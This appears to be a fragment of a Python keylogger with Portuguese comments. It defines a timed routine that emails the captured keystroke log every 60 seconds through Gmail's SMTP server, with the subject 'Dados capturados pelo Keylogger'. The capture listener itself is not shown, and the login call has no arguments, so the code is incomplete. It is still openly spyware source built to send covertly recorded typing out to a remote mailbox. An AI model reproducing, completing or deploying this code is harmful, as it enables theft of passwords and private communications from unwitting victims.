from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer

# configurações de Email
EMAIL_ORIGEM = ""
EMAIL_DESTINO = ""
SENHA_EMAIL = ""

log = ""

def enviar_email():
    global log
    if log:
        msg = MIMEText(log)
        msg['SUBJECT'] = "Dados capturados pelo Keylogger"
        msg['From'] = EMAIL_ORIGEM
        msg['To'] = EMAIL_DESTINO
        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login()
            server.send_message(msg)
            server.quit()
        except Exception as e:
            print("Erro ao enviar", e)

        log = ""

    Timer(60, enviar_email).start()